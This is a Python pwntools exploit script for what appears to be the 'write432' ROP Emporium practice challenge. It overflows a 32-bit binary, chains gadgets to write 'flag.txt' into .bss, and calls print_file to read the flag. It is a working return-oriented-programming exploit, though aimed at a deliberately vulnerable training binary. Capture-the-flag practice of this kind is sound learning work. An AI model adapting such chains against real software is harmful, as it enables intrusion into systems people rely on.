#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template write432
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('write432')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'


filename = './write432'
context.clear(arch='i386')
elf = ELF(filename)
io = process(filename)
r = ROP(elf)

pop_edi_ebp_rep = 0x080485aa
mov = 0x08048543
bss = elf.bss()

#main - offset
r.raw(cyclic(44))

# 1st write
r.raw(pop_edi_ebp_rep)
r.raw(p32(bss))
r.raw(b'flag')  
r.raw(mov)

# 2nd write
r.raw(pop_edi_ebp_rep)
r.raw(p32(bss+4))
r.raw(b'.txt')
r.raw(mov)

r.call('print_file', [bss])

payload = r.chain()
print(r.dump())

with open("tmp","w") as f:
    f.write(payload)
    f.close()

io.recvuntil('>')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))
